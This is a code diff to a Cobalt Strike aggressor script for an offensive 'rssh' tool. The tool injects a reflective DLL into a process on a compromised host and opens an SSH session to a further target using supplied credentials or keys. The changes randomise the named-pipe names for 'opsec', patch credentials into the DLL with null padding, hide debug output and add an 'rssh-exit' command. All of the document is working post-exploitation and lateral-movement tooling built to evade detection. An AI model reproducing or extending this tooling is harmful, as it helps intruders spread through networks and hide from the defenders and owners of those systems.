@@ -3,13 +3,13 @@ import beacon.CommandBuilder;
 global('$ssh_inited $pipe_wait $error_1 $ssh_key_stomp_me $usage $server_dll_name $bof_write_pipe_name $reading_inited $pipe_output_name_final $pipe_input_name_final $pipe_output_stomp_me_name $pipe_input_stomp_me_name $ssh_ip_stomp_me $ssh_username_stomp_me $ssh_password_stomp_me');
 $ssh_inited = -1;
 $reading_inited = -1;
-$pipe_output_name_final = "BigGasPipe_000"; # Change the pipe name an reload the CNA for 'opsec', 28-bytes MAX
-$pipe_input_name_final = "BigGasPipe_001"; # Change the pipe name an reload the CNA for 'opsec', 28-bytes MAX
+$pipe_output_name_final = "BigGasPipe_updater_01_"; # Change the pipe name an reload the CNA for 'opsec', 25-bytes MAX
+$pipe_input_name_final = "BigGasPipe_updater_02_"; # Change the pipe name an reload the CNA for 'opsec', 25-bytes MAX
 
 $pipe_output_stomp_me_name = "OUTPUT_PIPE_NAME_NO_CHANGE_PLS";
 $pipe_input_stomp_me_name = "INPUT_PIPE_NAME_NO_CHANGE_PLS";
 
-$ssh_key_stomp_me = "SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_"; # 1706 bytes
+$ssh_key_stomp_me = "SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_C"; # 2048 bytes
 
 $ssh_ip_stomp_me = "999.999.999.999";
 $ssh_username_stomp_me = "USERNAME_STRING_NO_CHANGE_PLS_USERNAME_STRING_NO_CHANGE_PLS_____";
@@ -22,6 +22,11 @@ $bof_write_pipe_name  = "bof_write_pipe.x64.o";
 $usage = "You must init ssh first. Try: rssh-init <target ip> <username> <password> <optional: pid>";
 $error_1 = "[RSSH] is already initialized.";
 
+# $1 - string
+sub append_random {
+    return $1 . rand(101);
+}
+
 # $1 - bytes where we are going to do the stoming
 # $2 - string we want to stomp
 # $3 - length of the string we want to stomp (for padding)
@@ -33,10 +38,22 @@ sub stomp-str {
     $stomp_me_string_len = $3;
     $output_string = $4;
 
+    if ($output_string is $null){ # if string we're stomping in is null, just stomp in null bytes
+        $null_padding = "";
+        $i = 0;
+        while ($i < $stomp_me_string_len) {
+            $null_padding = $null_padding . chr(0); # Append an actual null byte
+            $i = $i + 1;
+        }
+
+        $output_string = strrep($bytes, $stomp_me_string, $null_padding);
+        return $output_string;
+    }
+
     $padding_needed = $stomp_me_string_len - strlen($output_string);
     $padded_output_string = $output_string;
     
-    println("ORIGINAL STRING: " . $stomp_me_string . "LEN: " . strlen($output_string));
+    # println("ORIGINAL STRING: " . $stomp_me_string . "LEN: " . strlen($output_string));
 
     if ($padding_needed > 0) {
         $null_padding = "";
@@ -47,16 +64,16 @@ sub stomp-str {
         }
         $padded_output_string = $output_string . $null_padding;
     } else if ($padding_needed < 0) {
-        println("String '" . $output_string . " of length " . strlen($output_string) . "' is longer than max " . $stomp_me_string_len . " bytes!");
+        println("String of length " . strlen($output_string) . " is longer than max " . $stomp_me_string_len . " bytes!");
         return; # Important to return if name is too long
     }
 
-    println("NEW STRING: " . $output_string);
+    # println("NEW STRING: " . $output_string);
 
     # Now use $padded in strrep
     $output_string = strrep($bytes, $stomp_me_string, $padded_output_string);
     
-    println("FINAL STRING: " . $output_string);
+     # println("FINAL STRING: " . $output_string);
 
     return $output_string;
 }
@@ -75,7 +92,7 @@ alias rssh-key-init {
     $pid = $5; # optional PID
 
     if($ssh_inited > 0){
-        berror($beacon_id , $$error_1);
+        berror($beacon_id , $error_1);
         return;
     }
 
@@ -96,6 +113,10 @@ alias rssh-key-init {
     if ($pid == $null){
         $pid = beacon_info($beacon_id, "pid");
     }
+
+    # Add random number to the pipe names
+    $pipe_input_name_final = append_random($pipe_input_name_final);
+    $pipe_output_name_final = append_random($pipe_output_name_final);
 
     blog($beacon_id, "[RSSH] SSH client connecting to " . $target_ip . " with " . $target_username ." by injecting into process " . $pid . ".");
 
@@ -126,7 +147,7 @@ alias rssh-key-init {
     closef($handle);
 
     # Now use $ssh_ip_stomp_me in strrep
-    $rdll = stomp-str($rdll, $ssh_key_stomp_me, "1707", $target_ssh_key);
+    $rdll = stomp-str($rdll, $ssh_key_stomp_me, "2049", $target_ssh_key);
 
     # Now use $ssh_ip_stomp_me in strrep
     $rdll = stomp-str($rdll, $ssh_ip_stomp_me, "15", $target_ip);
@@ -137,7 +158,7 @@ alias rssh-key-init {
 
     # RDLL STOMP Password that we want to use to try to authenticate to the SSH server  #
     # Now use $ssh_password_stomp_me in strrep
-    $rdll = stomp-str($rdll, $ssh_password_stomp_me, "64", "0");
+    $rdll = stomp-str($rdll, $ssh_password_stomp_me, "64", $null);
 
     # RDLL STOMP INPUT PIPE, this is the pipe we use to send commands that are forwarded to the rdll to the target  #
     # Now use $pipe_input_stomp_me_name in strrep
@@ -186,7 +207,7 @@ alias rssh-key-init {
     if($reading_inited < 0){
 
         # give the pipes a couple of seconds to open
-        bpause($beacon_id, int(2  * 1000));
+        bpause($beacon_id, int(5  * 1000));
 
         # read from the output pipe
         rssh-read($beacon_id, $null);
@@ -195,8 +216,6 @@ alias rssh-key-init {
 
     }
 }
-
-
 
 # $1 - beacon id
 # $2 - target IP address
@@ -212,7 +231,7 @@ alias rssh-init {
     $pid = $5; # optional PID
 
     if($ssh_inited > 0){
-        berror($beacon_id , $$error_1);
+        berror($beacon_id , $error_1);
         return;
     }
 
@@ -233,6 +252,10 @@ alias rssh-init {
     if ($pid == $null){
         $pid = beacon_info($beacon_id, "pid");
     }
+
+    # Add random number to the pipe names
+    $pipe_input_name_final = append_random($pipe_input_name_final);
+    $pipe_output_name_final = append_random($pipe_output_name_final);
 
     blog($beacon_id, "[RSSH] SSH client connecting to " . $target_ip . " with " . $target_username . ":" . $target_password ." by injecting into process " . $pid . ".");
 
@@ -256,7 +279,7 @@ alias rssh-init {
     closef($handle);
 
     # Now use $ssh_ip_stomp_me in strrep
-    $rdll = stomp-str($rdll, $ssh_key_stomp_me, "1707", "0");
+    $rdll = stomp-str($rdll, $ssh_key_stomp_me, "2049", $null);
 
     # Now use $ssh_ip_stomp_me in strrep
     $rdll = stomp-str($rdll, $ssh_ip_stomp_me, "15", $target_ip);
@@ -392,6 +415,34 @@ alias rssh-exec {
     beacon_inline_execute($bid, $bof_data, "go", $args);
 }
 
+alias rssh-exit {
+    local('$bid $data $bof $args $bof_path $handle $bof_data');
+    $bid = $1;
+    $data = "exit";
+    
+    if($ssh_inited < 0){
+        berror($bid, $usage);
+        return;
+    }
+
+    $args = bof_pack($bid, "z", $data);
+
+    # Build bof path; This needs rework if you want to support x86 for whatever reason
+    $bof_path = getFileProper(script_resource("."), "out", "x64", $bof_write_pipe_name);
+
+    # read in the right BOF file
+    $handle = openf($bof_path);
+    $bof_data = readb($handle, -1);
+    closef($handle);
+
+    # execute it.
+    beacon_inline_execute($bid, $bof_data, "go", $args);
+
+    # reset globals
+    $ssh_inited = -1;
+    $reading_inited = -1;
+}
+
 # --------------------
 # Register the command
 # --------------------
@@ -419,5 +470,12 @@ beacon_command_register(
 	"rssh-exec",
 	"(64-bit only) Uses a bof to write a command to a pipe that is read by a user implemented reflective DLL and sent to the ssh target.",
 	"rssh-exec <user command>\nex:rssh-exec whoami",
+	"rssh"
+);
+
+beacon_command_register(
+	"rssh-exit",
+	"(64-bit only) Uses a bof to write the exit command to a pipe that is read by a user implemented reflective DLL and sent to the ssh target. SSH session exits",
+	"rssh-exit\nex:rssh-exit",
 	"rssh"
 );
